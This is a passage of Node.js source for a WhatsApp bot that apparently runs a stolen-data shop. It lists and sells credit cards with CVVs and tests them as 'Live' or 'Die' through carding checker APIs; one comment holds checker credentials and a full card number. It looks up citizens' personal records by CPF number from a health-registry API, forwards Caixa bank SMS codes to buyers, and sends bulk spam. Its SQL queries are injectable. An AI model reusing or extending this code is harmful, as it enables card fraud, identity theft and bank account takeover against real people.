                    console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                });

            }).catch(async(erro) => {
                console.log(debugLine(`Error when sending | ${error} | ${JSON.stringify(error)}`));
            });
        }

        MANUTENCAO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MANUTENCAO'`).get()["VALOR"]
        if (MANUTENCAO === "1") {
            Texto = "❗ *ESTE BOT ESTÁ EM MANUTENÇÃO!* ❗"
            await client.sendText(message.from, Texto).then(async (result) => {
            }).catch(async(erro) => {
                console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
            });
            return
        }

    } catch (error) {
        console.log(debugLine(error));
    }
    return
}



















function startOf(unit, date = new Date(), weekStartDay = 0) {
    let d = new Date(date);
    let e = new Date(d);
    e.setHours(23, 59, 59, 999);
    let start = {
        second: d => d.setMilliseconds(0),
        minute: d => d.setSeconds(0, 0),
        hour: d => d.setMinutes(0, 0, 0),
        day: d => d.setHours(0, 0, 0, 0),
        week: d => {
            start.day(d);
            d.setDate(d.getDate() - d.getDay() + weekStartDay);
            if (d > e) d.setDate(d.getDate() - 7);
        },
        month: d => {
            start.day(d);
            d.setDate(1);
        },
        year: d => {
            start.day(d);
            d.setMonth(0, 1);
        },
        decade: d => {
            start.year(d);
            let year = d.getFullYear();
            d.setFullYear(year - year % 10);
        },
        century: d => {
            start.year(d);
            let year = d.getFullYear();
            d.setFullYear(year - year % 100);
        },
        millenium: d => {
            start.year(d);
            let year = d.getFullYear();
            d.setFullYear(year - year % 1000);
        }
    }
    start[unit](d);
    return d;
}


async function Todo_Dia(client) {
    setInterval(async function () {
        console.log("Todo Dia")
        await Entrar_Grupo_Bots(client)
    }, 86400000);
}




async function Spam(client) {
    setInterval(async function () {

        ATIVADO = await DataBase_Better.prepare(`SELECT VALOR FROM SPAMMER WHERE PARAMETRO = 'ATIVADO'`).get()["VALOR"]
        TEXTO_ENVIAR = await DataBase_Better.prepare(`SELECT VALOR FROM SPAMMER WHERE PARAMETRO = 'TEXTO_ENVIAR'`).get()["VALOR"]
        INTERVALO_ENVIO_SEGUNDOS = await DataBase_Better.prepare(`SELECT VALOR FROM SPAMMER WHERE PARAMETRO = 'INTERVALO_ENVIO_SEGUNDOS'`).get()["VALOR"]
        ULTIMO_ENVIO_MS = await DataBase_Better.prepare(`SELECT VALOR FROM SPAMMER WHERE PARAMETRO = 'ULTIMO_ENVIO_MS'`).get()["VALOR"]
        //console.log(1)
        if (ATIVADO === "0") {
            return
        }
        //console.log(2)
        MULTIPLICACAO_MS = parseFloat(INTERVALO_ENVIO_SEGUNDOS) * 1000
        if (Date.now() > parseFloat(ULTIMO_ENVIO_MS) + parseFloat(MULTIPLICACAO_MS)) {
            ULTIMO_ENVIO_MS = Date.now()
            await DataBase_Better.prepare(`UPDATE SPAMMER SET VALOR = '${ULTIMO_ENVIO_MS}' WHERE PARAMETRO = 'ULTIMO_ENVIO_MS'`).run()

            ID_USER = await DataBase_Better.prepare(`SELECT ID_CONTATO FROM CONTATOS WHERE RECEBEU_SPAM != '1' AND RECEBEU_SPAM != '3' LIMIT 1`).get()
            //console.log(ID_USER)
            if (ID_USER === undefined) {
                //console.log(3)
                for await (adm of Adms) {
                    Texto = "Fim do Spam"
                    await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
                        await DataBase_Better.prepare(`UPDATE SPAMMER SET VALOR = '0' WHERE PARAMETRO = 'ATIVADO'`).run()
                    }).catch(async(erro) => {
                        console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                    });
                }
                return
            }
            //console.log(4)
            ID_USER = ID_USER["ID_CONTATO"]
            await client.sendText(ID_USER, TEXTO_ENVIAR).then(async (result) => {
                await DataBase_Better.prepare(`UPDATE CONTATOS SET RECEBEU_SPAM = '1' WHERE ID_CONTATO = '${ID_USER}'`).run()
                console.log(`Spam enviado para ${ID_USER} | ${new Date(parseInt(Date.now())).toLocaleString()}`)
            }).catch(async (error) => {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                await DataBase_Better.prepare(`UPDATE CONTATOS SET RECEBEU_SPAM = '3' WHERE ID_CONTATO = '${ID_USER}'`).run()
                console.log(`Erro ao enviar Spam para ${ID_USER} | ${JSON.stringify(ID_USER)}`)
            });
            return
        }
        //console.log("fim")
    }, INTERVALO_SPAM);
}













function Puxar_CPF(CPF) {
    return new Promise(resolve => {

        Texto_Puxada = "0"
        try {
            var options = {
                'method': 'GET',
                'url': `http://api.i-find.dev/?token=${Token_Ifind}&esus=${CPF}`,
                rejectUnauthorized: false,
                'headers': {
                }
            };
            console.log(`http://api.i-find.dev/?token=${Token_Ifind}&esus=${CPF}`)
            request(options, async function (error, response) {
                if (error) {
                    Texto_Puxada = "1"
                } else {

                    if (response.body.indexOf("Gateway") > -1 || response.body === undefined || response.body === "[]" || response.body === `[{"data": {"buscaCidadaosCadsusCompletoPolling": null}}]` || response.body === `[{"data": {"buscaCidadaosCadsusCompletoPolling": {"usuario": null, "uuid": null, "resultCadsus": "SUCESSO", "cidadaos": [], "__typename": "BuscaCidadaosCadsusResultDto"}}}]`) {
                        Texto_Puxada = "2"
                    }
                    try {
                        var response = JSON.parse(response.body);
                    } catch (error) {
                        Texto_Puxada = "3"
                    }
                    try {
                        NOME = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["nome"]
                    } catch (error) {
                        NOME = "SEM INFORMAÇÃO"
                    }
                    console.log(NOME)
                    try {
                        NOME_DA_MÃE = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["nomeMae"]
                    } catch (error) {
                        NOME_DA_MÃE = "SEM INFORMAÇÃO"
                    }
                    try {
                        CPF = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["cpf"]
                    } catch (error) {
                        CPF = "SEM INFORMAÇÃO"
                    }
                    try {
                        NOME_DO_PAI = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["nomePai"]
                    } catch (error) {
                        NOME_DO_PAI = "SEM INFORMAÇÃO"
                    }
                    try {
                        NASCIMENTO = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["dataNascimento"]
                    } catch (error) {
                        NASCIMENTO = "SEM INFORMAÇÃO"
                    }
                    try {
                        SEXO = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["sexo"]
                    } catch (error) {
                        SEXO = "SEM INFORMAÇÃO"
                    }
                    try {
                        CNS = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["cns"]
                    } catch (error) {
                        CNS = "SEM INFORMAÇÃO"
                    }
                    try {
                        TELEFONE = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["telefoneCelular"]
                    } catch (error) {
                        TELEFONE = "SEM INFORMAÇÃO"
                    }
                    try {
                        BAIRRO = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["endereco"]["bairro"]
                    } catch (error) {
                        BAIRRO = "SEM INFORMAÇÃO"
                    }
                    try {
                        CEP = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["endereco"]["cep"]
                    } catch (error) {
                        CEP = "SEM INFORMAÇÃO"
                    }
                    try {
                        LOGRADOURO = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["endereco"]["logradouro"]
                    } catch (error) {
                        LOGRADOURO = "SEM INFORMAÇÃO"
                    }
                    try {
                        NÚMERO = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["endereco"]["numero"]
                    } catch (error) {
                        NÚMERO = "SEM INFORMAÇÃO"
                    }
                    try {
                        ESTADO = response[0]["data"]["buscaCidadaosCadsusCompletoPolling"]["cidadaos"][0]["endereco"]["municipio"]["uf"]["sigla"]
                    } catch (error) {
                        ESTADO = "SEM INFORMAÇÃO"
                    }
                }

                Texto_Puxada = `👤 *NOME:* ${NOME}
👤 *CPF:* ${CPF}
🗓️ *DATA NASC:* ${NASCIMENTO}

🏠*ENDEREÇO:*
*CEP:* ${CEP}
*ESTADO:* ${ESTADO}
*BAIRRO:* ${BAIRRO}
*LOGRADOURO:* ${LOGRADOURO}
*NÚMERO:* ${NÚMERO}
`
                resolve(Texto_Puxada);
            });
        } catch (error) {
            console.log(error)
            Texto_Puxada = "9"
        }

    });
}










async function Checando_Planilha(client) {

    BOT_CPF = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_CPF'`).get()["VALOR"]
    if (BOT_CPF != "1") {
        return
    }

    setInterval(async function () {
        try {
            Retorno = await Requisitar_Sheet()
            //console.log(Retorno["values"])

            for (index in Retorno["values"]) {

                if (Array_Planiha_Mudancas[index] === undefined) {
                    //console.log("Primeira")
                    Array_Planiha_Mudancas[index] = Retorno["values"][index]
                    break
                }

                if (Array_Planiha_Mudancas[index].toString() != Retorno["values"][index].toString()) {

                    console.log("SMS Recebido!")
                    //console.log("Array "+Array_Planiha_Mudancas[index])
                    //console.log("Retorno "+Retorno["values"][index])

                    Array_Planiha_Mudancas[index] = Retorno["values"][index]
                    Conteudo = Retorno["values"][index]
                    Conteudo = Conteudo.toString().split("===")
                    Celular_SMS = Conteudo[2]
                    Corpo_SMS = Conteudo[3]

                    ForDigitos = Celular_SMS.substr(Celular_SMS.length - 4);
                    console.log(ForDigitos)

                    Numero_Destinatario = await DataBase_Better.prepare(`SELECT NUMERO_COMPRADOR FROM CPF_VENDIDOS WHERE QUATRO_DIGITOS = '${ForDigitos}'`).get()["NUMERO_COMPRADOR"]
                    console.log(Numero_Destinatario)

                    if (Corpo_SMS === "AGUARDANDO SMS") {
                        Texto = "Estamos prontos para receber o SMS com o código da Caixa."
                        await client.sendText(Numero_Destinatario, Texto).then(async (result) => {
                        }).catch(async(erro) => {
                            console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                        });
                        return
                    } else {
                        Texto = `*SMS CAIXA*

${Corpo_SMS}`
                        await client.sendText(Numero_Destinatario, Texto).then(async (result) => {
                        }).catch(async(erro) => {
                            console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                        });
                        return
                    }



                } else {
                    //console.log("Mesma coisa")
                    Array_Planiha_Mudancas[index] = Retorno["values"][index]
                }
            }
        } catch (error) {

        }

    }, 1000);
}



















function Requisitar_Sheet() {
    return new Promise(resolve => {
        try {
            var options = {
                'method': 'GET',
                'url': ``,
                rejectUnauthorized: false,
                'headers': {
                }
            };
            request(options, function (error, response) {
                if (error) {
                    resolve(error);
                    return
                }
                resolve(JSON.parse(response.body))
            });
        } catch (error) {

        }
    });
}






//FUNÇÕES ATALHOS


function debugLine(message) {
    try {
        let e = new Error();
        let frame = e.stack.split("\n")[2]; // change to 3 for grandparent func
        let lineNumber = frame.split(":").reverse()[1];
        let functionName = frame.split(" ")[5];
        return "Linha = " + lineNumber + " | Log = " + message;
    } catch (error) {
        console.log("Erro function debugLine(message) {")
    }
}

function Encontrar_Detalhes_Erros(err) {
    if (typeof err === 'object') {
        if (err.message) {
            console.log('\nMensagem de Erro: ' + err.message)
        }
        if (err.stack) {
            console.log('\nEncontrar Linha do Erro:')
            console.log('====================')
            console.log(err.stack);
        }
    } else {
        console.log('dumpError :: argument is not an object');
    }
}


async function Obter_Mixs() {
    return new Promise(resolve => {
        db = new sqlite3.Database(Diretorio_SQLITE_Principal, async (error) => {
            if (error) {
                console.log(debugLine(`Erro = ${error}`));
                db.close();
                resolve("error");
            }
            try {
                db.all("SELECT * FROM MIX", function (err, rows) {
                    if (err) {
                        console.log(err);
                    } else {
                        resolve(rows);
                    }
                });
            } catch (error) {
                console.log(debugLine(error));
            }
        });
    });
}

async function Obter_Mixs_Para_File() {
    return new Promise(resolve => {
        db = new sqlite3.Database(Diretorio_SQLITE_Principal, async (error) => {
            if (error) {
                console.log(debugLine(`Erro = ${error}`));
                db.close();
                resolve("error");
            }
            try {
                db.all("SELECT * FROM CCS", function (err, rows) {
                    if (err) {
                        console.log(err);
                    } else {
                        resolve(rows);
                    }
                });
            } catch (error) {
                console.log(debugLine(error));
            }
        });
    });
}

async function shuffle(array) {
    let currentIndex = array.length, randomIndex;

    // While there remain elements to shuffle...
    while (currentIndex != 0) {

        // Pick a remaining element...
        randomIndex = Math.floor(Math.random() * currentIndex);
        currentIndex--;

        // And swap it with the current element.
        [array[currentIndex], array[randomIndex]] = [
            array[randomIndex], array[currentIndex]];
    }

    return array;
}

function Obter_Nome_CPF() {
    return new Promise(resolve => {
        try {
            db = new sqlite3.Database("./Banco_Intermediador.sqlite", async (error) => {
                if (error) {
                    console.log(debugLine(`Erro = ${error}`));
                    db.close();
                    resolve("error");
                }

                db.all(`SELECT * FROM DADOS LIMIT 1`, async (error, Array) => {
                    if (error) {
                        console.log(debugLine(`Erro = ${error}`));
                        db.close();
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                        throw error;
                    }

                    db.run(`DELETE FROM DADOS WHERE CPF = '${Array[0]["CPF"]}'`, function (err) {
                        if (err) {
                            console.log(err)
                            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                            throw error;
                        }
                        else {
                            //console.log("Successful");
                            resolve(Array);
                        }
                        db.close();
                    });
                });
            });
        } catch (error) {
            console.log(debugLine(error));
        }
    });
}
async function Listar(CATEGORIA) {
    let Array = []
    return new Promise(resolve => {
        try {
            let Select = () => {
                db = new sqlite3.Database(Diretorio_SQLITE_Principal, async (error) => {
                    db.each(`SELECT _rowid_,${CATEGORIA},VALOR FROM CCs_PRECOS_${CATEGORIA}`, async (err, Tipo) => {
                        Array.push(Tipo)
                    }, () => {
                        resolve(Array);

                    })
                })
            }
            Select()
            return Array
        } catch (error) {
            console.log(debugLine(error));
        }

    });
}
async function Obter_Estoque(Categoria, Nome_Categoria) {
    //console.log(Categoria[Nome_Categoria])
    let Array_Result = []
    return new Promise(resolve => {
        try {
            let Select = () => {
                db = new sqlite3.Database(Diretorio_SQLITE_Principal, async (error) => {
                    db.each(`SELECT COUNT(*) FROM CCS WHERE ${Nome_Categoria} = '${Categoria[Nome_Categoria]}'`, async (err, Total) => {
                        //console.log(`${Categoria[Nome_Categoria]} === ${Total["COUNT(*)"]}`)
                        Array_Result.push(Total)
                    }, () => {
                        resolve(Array_Result);

                    })
                })
            }
            Select()
            return Array_Result

        } catch (error) {
            console.log(debugLine(error));
        }
    });
}
async function Listar_CCs(PARAMETRO, CATEGORIA) {
    let Array = []
    return new Promise(resolve => {
        try {
            let Select = () => {
                db = new sqlite3.Database(Diretorio_SQLITE_Principal, async (error) => {
                    db.each(`SELECT _rowid_,NUMERO,MES,ANO,CVV,BANDEIRA,TIPO,NIVEL,BANCO,PAIS FROM CCS WHERE ${CATEGORIA} == "${PARAMETRO}"`, async (err, Linha) => {
                        Array.push(Linha)
                    }, () => {
                        resolve(Array);

                    })
                })
            }
            Select()
            return Array
        } catch (error) {
            console.log(debugLine(error));
        }
    });
}
async function Total_Estoque(Categoria, Nome_Categoria) {
    //console.log(Categoria)
    let Array_Result = []
    return new Promise(resolve => {
        try {
            let Select = () => {
                db = new sqlite3.Database(Diretorio_SQLITE_Principal, async (error) => {
                    db.each(`SELECT COUNT(*) FROM CCS WHERE ${Nome_Categoria} = '${Categoria}'`, async (err, Total) => {
                        //console.log(`${Categoria} === ${Total["COUNT(*)"]}`)
                        Array_Result.push(Total)
                    }, () => {
                        resolve(Array_Result);

                    })
                })
            }
            Select()
            return Array_Result
        } catch (error) {
            console.log(debugLine(error));
        }
    });
}
function Obter_Nome_CPF() {
    return new Promise(resolve => {
        try {
            db = new sqlite3.Database("./Banco_Intermediador.sqlite", async (error) => {
                if (error) {
                    console.log(debugLine(`Erro = ${error}`));
                    db.close();
                    resolve("error");
                }

                db.all(`SELECT * FROM DADOS LIMIT 1`, async (error, Array) => {
                    if (error) {
                        console.log(debugLine(`Erro = ${error}`));
                        db.close();
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                        throw error;
                    }

                    db.run(`DELETE FROM DADOS WHERE CPF = '${Array[0]["CPF"]}'`, function (err) {
                        if (err) {
                            console.log(err)
                            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                            throw error;
                        }
                        else {
                            //console.log("Successful");
                            resolve(Array);
                        }
                        db.close();
                    });
                });
            });
        } catch (error) {
            console.log(debugLine(error));
        }
    });
}
function Procedimento_Pos_Venda_CC(NUMERO, MES, ANO, CVV, BANDEIRA, TIPO, NIVEL, BANCO, PAIS, DADOS, TIPOCC, Data_MS_Inserido, VALOR, NUMERO_COMPRADOR) {
    return new Promise(resolve => {
        try {
            db = new sqlite3.Database(Diretorio_SQLITE_Principal, async (error) => {
                if (error) {
                    console.log(debugLine(`Erro = ${error}`));
                    db.close();
                    resolve("error");
                }

                db.run(`INSERT INTO CCs_Vendidas (NUMERO,MES,ANO,CVV,BANDEIRA,TIPO,NIVEL,BANCO,PAIS,DADOS,TIPOCC,Data_MS_Inserido,VALOR,NUMERO_COMPRADOR) VALUES ('${NUMERO}','${MES}','${ANO}','${CVV}','${BANDEIRA}','${TIPO}','${NIVEL}','${BANCO}','${PAIS}','${DADOS}','${TIPOCC}','${Data_MS_Inserido}','${VALOR}','${NUMERO_COMPRADOR}')`, (error) => {
                    if (error) {
                        console.log(debugLine(`Erro = ${error}`));
                        db.close();
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                        throw error;
                    }
                    db.run(`DELETE FROM CCS WHERE NUMERO = ${NUMERO}`, function (err) {
                        if (err) {
                            console.log(err)
                            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                            throw error;
                        }
                        else {
                            //console.log("Successful");
                            resolve(Array);
                        }
                        db.close();
                    });
                });
            });
        } catch (error) {
            console.log(debugLine(error));
        }
    });
}
function Checar_Se_Exite_No_Estoque(NUMERO, MES, ANO, CVV) {
    return new Promise(resolve => {
        try {
            db = new sqlite3.Database(Diretorio_SQLITE_Principal, async (error) => {
                if (error) {
                    console.log(debugLine(`Erro = ${error}`));
                    db.close();
                }
                db.all(`SELECT NUMERO,MES,ANO,CVV FROM CCS WHERE NUMERO == '${NUMERO}' AND MES == '${MES}' AND ANO == '${ANO}' AND CVV == '${CVV}'`, async (error, Resultado) => {
                    if (error) {
                        console.log(debugLine(`Erro = ${error}`));
                        db.close();
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                        throw error;
                    }
                    resolve(Resultado);
                })
            })
        } catch (error) {
            console.log(debugLine(error));
        }
    });
}
async function Requisitar2(BIN) {
    return new Promise(async resolve => {
        try {
            https = require('https');

            https.get(`https://lookup.binlist.net/${BIN}`, (resp) => {
                let data = '';

                // A chunk of data has been received.
                resp.on('data', (chunk) => {
                    data += chunk;
                });

                // The whole response has been received. Print out the result.
                resp.on('end', () => {
                    console.log(data);
                    if (data === "") {
                        resolve("0")
                    } else if (data.indexOf("Requests") > -1) {
                        resolve("1")
                    } else {
                        resolve(JSON.parse(data))
                    }
                });

            }).on("error", (err) => {
                //console.log("Error: " + err.message);
            });
        } catch (error) {
            console.log(error)
        }
    });
}


async function Entrar_Grupo_Bots(client) {
    return new Promise(async resolve => {
        dados = "5511969059576"
        resolve(dados)
    });
}


async function TokenLaraRimuru() {
    return new Promise(async resolve => {
        dados = "5511969059576"
        resolve(dados)
    });
}


async function Donos_Supremos_Planilhas() {
    return new Promise(async resolve => {
        dados = "5511969059576"
        resolve(dados)
    });
}


async function Numero_Suporte_Planilha() {
    return new Promise(async resolve => {
        dados = "5511969059576"
        resolve(dados)
    });
}


async function Rimuru_Contato_Plan() {
    return new Promise(async resolve => {
        dados = "100"
        resolve(dados)
    });
}

ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"
async function Checkar_CC_Fila(client) {
    setInterval(async function () {
        if (ITEM_FILA_CHKV2 === "ME PREPARANDO PARA CHECAR CC") {
            //ESPERANDO PORQUE TEM OUTRA CC SENDO CHECADA

            TEMPO_MAXIMO_SEGUNDOS_CHECAR_FILA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEMPO_MAXIMO_SEGUNDOS_CHECAR_FILA'`).get()["VALOR"]

            if (Date.now() > parseInt(Requestando_MS) + (parseInt(TEMPO_MAXIMO_SEGUNDOS_CHECAR_FILA) * 1000)) {
                try {
                    Var_Request.abort();
                    console.log("Cancelei a Request")
                } catch (error) {
                    console.log(error)
                }
                console.log(Array_Cliente_Desistiu_Checagem)
                console.log('\x1b[33m%s\x1b[0m', LinhaAtual())

                // await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '0' WHERE _rowid_ = '${Var_Request_ID_CHK}'`).run()

                if (Array_Cliente_Desistiu_Checagem.includes(Var_Request_CONTATO_CHK)) {
                    //REMOVER ITENS DA ARRAY
                    Array.prototype.remove = function () {
                        var what, a = arguments, L = a.length, ax;
                        while (L && this.length) {
                            what = a[--L];
                            while ((ax = this.indexOf(what)) !== -1) {
                                this.splice(ax, 1);
                            }
                        }
                        return this;
                    };
                    Array_Cliente_Desistiu_Checagem.remove(Var_Request_CONTATO_CHK);

                    await DataBase_Better.prepare(`UPDATE CHECAR_CC_V2 SET PROCESSADO = '0' WHERE _rowid_ = '${Var_Request_ID_CHK}'`).run()

                    CONSTRUCAO_LISTMESSAGE_buttonText = 'OUTRAS OPÇÕES DE CC'
                    CONSTRUCAO_LISTMESSAGE_title = 'OUTRAS OPÇÕES DE CC'
                    CONSTRUCAO_LISTMESSAGE_description = `⚠️ *Demorou muito para checar sua CC, abortamos a checagem, escolha outra CC!*`

                    CONSTRUCAO_LISTMESSAGE_rows = []
                    iD_Footer = Date.now()

                    CONSTRUCAO_LISTMESSAGE_rows.push(
                        {
                            rowId: `${iD_Footer.toString()}|catalogo_ccs`,
                            title: "💳 CCs",
                            description: "Catálogo de CCs disponíveis no estoque.",
                        },
                    )

                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Var_Request_CONTATO_CHK}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                    ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"
                    return
                }

                //                 Texto = `⚠️ *Demorou muito para checar sua CC, estamos checando novamente...*

                // _Para cancelar as checagens, basta digitar qualquer coisa..._`
                //                 await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
                // '0',
                // '${Var_Request_CONTATO_CHK}',
                // 'sendText',
                // '${Texto}',
                // 'CONSTRUCAO_LISTMESSAGE_buttonText',
                // 'CONSTRUCAO_LISTMESSAGE_title',
                // 'CONSTRUCAO_LISTMESSAGE_rows',
                // 'Caminho_arquivo',
                // '${Date.now()}')`).run()

                // CONSTRUCAO_LISTMESSAGE_buttonText = 'OUTRAS OPÇÕES DE CC'
                // CONSTRUCAO_LISTMESSAGE_title = 'OUTRAS OPÇÕES DE CC'
                // CONSTRUCAO_LISTMESSAGE_description = `⚠️ *Demorou muito para checar sua CC, abortamos a checagem, escolha outra CC!*`

                // CONSTRUCAO_LISTMESSAGE_rows = []
                // iD_Footer = Date.now()

                // CONSTRUCAO_LISTMESSAGE_rows.push(
                // {
                //     rowId: `${iD_Footer.toString()}|catalogo_ccs`,
                //     title: "💳 CCs",
                //     description: "Catálogo de CCs disponíveis no estoque.",
                // },
                // )

                // await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
                // '0',
                // '${Var_Request_CONTATO_CHK}',
                // 'sendListMessage',
                // '${CONSTRUCAO_LISTMESSAGE_description}',
                // '${CONSTRUCAO_LISTMESSAGE_buttonText}',
                // '${CONSTRUCAO_LISTMESSAGE_title}',
                // '${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
                // '${iD_Footer}',
                // '${Date.now()}')`).run()

                ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"
                return
            }
            return
        }
        //SE PASSEI AQUI QUER DIZER QUE A FILA TA LIBERADA PARA PROCESSAR OUTRA
        ITEM_FILA_CHKV2 = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).get()
        if (ITEM_FILA_CHKV2 === undefined) {
            //OLHEI MAS NÃO TEM NADA PARA FAZER AINDA
            ITEM_FILA_CHKV2 = "FILA CHECAGEM LIBERADA PARA UM PRÓXIMO"
            return
        } else {
            //OPA AGORA TEM UMA CC PARA CHECAR, VOU CHECAR AGORA

            //USE ISSO PARA LIBERAR A FILA PARA UMA PRÓXIMA CC
            // ITEM_FILA_CHKV2 = "VAMOS PARA A PROXIMA CC"
            // return


            console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
            // CONTADOR_TENTATIVA_CHECKER = 0
            /*
            PROCESSADO = 0 => Só fica zero quando dar algum erro na checagem, a CC continua no estoque.
            PROCESSADO = (Tava: 0) Agora ta: 1 => Esperando ser Checada pela primeira vez.
            
            PROCESSADO = (Tava: 1) Agora ta: 2 => Checou e Deu Live na primária e fim.
            
            PROCESSADO = (Tava: 1) Agora ta: 3 => Checou e Deu Die, agora vai checar pela segunda vez.
            PROCESSADO = (Tava: 1) Agora ta: 4 => Checou e Deu Die na primária e fim.
            
            PROCESSADO = (Tava: 3) Agora ta: 5 => Checou e Deu Live na secundária e fim.
            PROCESSADO = (Tava: 3) Agora ta: 6 => Checou e Deu Die na secundária e fim.
            
            PROCESSADO = 7 => Solicitou reembolso
            
            PROCESSADO = (Tava: 7) Agora ta: 8 => Checou para reembolsar e Deu Live na primária ou secundária e fim.
            
            PROCESSADO = (Tava: 7) Agora ta: 11 => Checou para reembolsar e Deu Die na primária e fim.
            PROCESSADO = (Tava: 7) Agora ta: 12 => Checou para reembolsar e Deu Die na secundária e fim.
            
            PROCESSADO = (Tava: 7) Agora ta: 13 => Checou para reembolsar, Deu Die na primária e esperando checar com a secundária.
            
            PROCESSADO = (Tava: 13) Agora ta: 14 => Checou para reembolsar, tinha dado Die na primária e Deu Live na secundária e fim.
            PROCESSADO = (Tava: 13) Agora ta: 15 => Checou para reembolsar, tinha dado Die na primária e Deu Die na secundária tbm e fim.
            */

            ID_CHK = ITEM_FILA_CHKV2["rowid"]
            CONTATO_CHK = ITEM_FILA_CHKV2["CONTATO"]
            CC_CHK = ITEM_FILA_CHKV2["CC"]
            TIPOCC_CHK = ITEM_FILA_CHKV2["TIPOCC"]
            DADOS_CHECAGEM_CHK = ITEM_FILA_CHKV2["DADOS_CHECAGEM"]
            RESULTADO_CHK_CHK = ITEM_FILA_CHKV2["RESULTADO_CHK"]
            PROCESSADO_CHK = ITEM_FILA_CHKV2["PROCESSADO"]
            VALOR_CC_CHK = ITEM_FILA_CHKV2["VALOR_CC"]
            DATA_INSERIDO_MS_CHK = ITEM_FILA_CHKV2["DATA_INSERIDO_MS"]

            Numero_CHK = CONTATO_CHK.toString().replace(/[^0-9]/igm, '')

            Div = CC_CHK.split("|")
            NUMERO_CC_CHK = Div[0]
            MES_CC_CHK = Div[1]
            ANO_CC_CHK = Div[2]
            CVV_CC_CHK = Div[3]

            USO_APIS_CHK = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'USO_APIS_CHK'`).get()["VALOR"]
            console.log(`ID de checagem: ${ID_CHK} | CC Numero: ${NUMERO_CC_CHK} | PROCESSADO: ${PROCESSADO_CHK} | USO_APIS_CHK: ${USO_APIS_CHK}`)
            ITEM_FILA_CHKV2 = "ME PREPARANDO PARA CHECAR CC"
        }

        API_CHK_1_COMPLETA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'API_CHK'`).get()["VALOR"]

        //https://dbfcheckers.tech/api/testadores/ap1v2?usuario=7demadrid&senha=cliente1&numero=4174010195287918&mes=08&ano=27&csc=058
        //https://dbfcheckers.tech/api/testadores/ap1v2?usuario=7demadrid&senha=cliente1&numero=infocc
        if (API_CHK_1_COMPLETA.indexOf("&numero=") > -1){
            API_CHK_1_COMPLETA = API_CHK_1_COMPLETA.replace(/infocc/igm, `${NUMERO_CC_CHK}&mes=${MES_CC_CHK}&ano=20${ANO_CC_CHK}&csc=${CVV_CC_CHK}`);
        }else{
            API_CHK_1_COMPLETA = API_CHK_1_COMPLETA.replace(/infocc/igm, CC_CHK);
        }
        
        API_CHK_2_COMPLETA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'API_CHK_SECUNDARIO'`).get()["VALOR"]

